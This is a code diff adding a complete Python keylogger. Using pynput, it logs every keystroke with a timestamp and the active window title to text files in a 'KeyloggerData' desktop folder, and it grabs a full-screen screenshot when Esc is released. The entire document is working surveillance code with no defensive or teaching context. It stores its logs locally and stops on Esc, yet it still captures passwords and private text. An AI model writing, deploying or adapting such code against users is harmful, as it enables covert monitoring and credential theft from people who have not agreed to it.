@@ -1,0 +1,120 @@
+import os
+import time
+from time import gmtime, strftime
+from pynput.keyboard import Key, Listener
+from PIL import ImageGrab
+import pygetwindow
+
+# Get current timestamp
+time_stamp = strftime("%Y-%m-%d %H:%M:%S", gmtime())
+
+# Define paths for saving files on the desktop in a new folder called "KeyloggerData"
+desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+folder_name = "KeyloggerData"
+file_path = os.path.join(desktop_path, folder_name)
+screenshot_path = os.path.join(file_path, "Screenshots")
+
+# Create directories if they do not exist
+os.makedirs(file_path, exist_ok=True)
+os.makedirs(screenshot_path, exist_ok=True)
+
+# File paths and file names
+full_file_path = file_path + "\\"
+full_file_path_screenshots = screenshot_path + "\\"
+
+windowTitle = pygetwindow.getActiveWindowTitle()
+
+count = 0
+keys = []
+
+# Function to get a unique filename for the text file
+def get_unique_text_filename():
+    return "keylog_" + strftime("%Y%m%d-%H%M%S", gmtime()) + ".txt"
+
+# Create the initial text file
+current_text_file = get_unique_text_filename()
+
+# Function to log keystrokes
+def on_press(key):
+    global keys, count, windowTitle, time_stamp
+
+    keys.append(key)
+    count += 1
+    currentTime = strftime("%Y-%m-%d %H:%M:%S", gmtime())
+    secondWindow = pygetwindow.getActiveWindowTitle()
+
+    if windowTitle != secondWindow:
+        windowTitle = secondWindow
+
+    if time_stamp != currentTime:
+        time_stamp = currentTime
+
+    if count >= 1:
+        count = 0
+        write_file(keys, time_stamp, windowTitle)
+        keys = []
+
+# Function to write keystrokes to the log file
+def write_file(keys, time_stamp, windowTitle):
+    global current_text_file
+    with open(full_file_path + current_text_file, "a") as f:
+        for key in keys:
+            k = str(key)
+            if k.find("space") > 0:
+                f.write(f"{time_stamp}: 'Key.space' {windowTitle}\n")
+            elif k.find("enter") > 0:
+                f.write(f"{time_stamp}: 'Key.enter' {windowTitle}\n")
+            elif k.find("right") > 0:
+                f.write(f"{time_stamp}: 'Key.right' {windowTitle}\n")
+            elif k.find("left") > 0:
+                f.write(f"{time_stamp}: 'Key.left' {windowTitle}\n")
+            elif k.find("up") > 0:
+                f.write(f"{time_stamp}: 'Key.up' {windowTitle}\n")
+            elif k.find("down") > 0:
+                f.write(f"{time_stamp}: 'Key.down' {windowTitle}\n")
+            elif k.find("ctrl_r") > 0:
+                f.write(f"{time_stamp}: 'Key.ctrl_r' {windowTitle}\n")
+            elif k.find("ctrl_l") > 0:
+                f.write(f"{time_stamp}: 'Key.ctrl_l' {windowTitle}\n")
+            elif k.find("tab") > 0:
+                f.write(f"{time_stamp}: 'Key.tab' {windowTitle}\n")
+            elif k.find("shift_r") > 0:
+                f.write(f"{time_stamp}: 'Key.shift_r' {windowTitle}\n")
+            elif k.find("shift") > 0:
+                f.write(f"{time_stamp}: 'Key.shift_l' {windowTitle}\n")
+            elif k.find("backspace") > 0:
+                f.write(f"{time_stamp}: 'Key.backspace' {windowTitle}\n")
+            elif k.find("esc") > 0:
+                f.write(f"{time_stamp}: 'Key.esc' {windowTitle}\n")
+            elif k.find("delete") > 0:
+                f.write(f"{time_stamp}: 'Key.delete' {windowTitle}\n")
+            elif k.find("insert") > 0:
+                f.write(f"{time_stamp}: 'Key.insert' {windowTitle}\n")
+            elif k.find("alt_l") > 0:
+                f.write(f"{time_stamp}: 'Key.alt_l' {windowTitle}\n")
+            elif k.find("alt_gr") > 0:
+                f.write(f"{time_stamp}: 'Key.alt_gr' {windowTitle}\n")
+            elif k.find("cmd") > 0:
+                f.write(f"{time_stamp}: 'Key.cmd' {windowTitle}\n")
+            elif k.find("Key") == -1:
+                f.write(f"{time_stamp}: {k} {windowTitle}\n")
+
+# Function to capture a screenshot and save it with a unique name
+def capture_screenshot():
+    # Create a unique filename using a timestamp
+    screenshot_filename = "screenshot_" + strftime("%Y%m%d-%H%M%S", gmtime()) + ".png"
+    screenshot = ImageGrab.grab()
+    screenshot.save(full_file_path_screenshots + screenshot_filename)
+
+# Function to detect key release events
+def on_release(key):
+    global current_text_file
+    if key == Key.esc:
+        capture_screenshot()  # Take screenshot on esc key release with a unique filename
+        # Create a new text file with a unique name for the next round of keystrokes
+        current_text_file = get_unique_text_filename()
+        return False
+
+# Listener for key press and release events
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
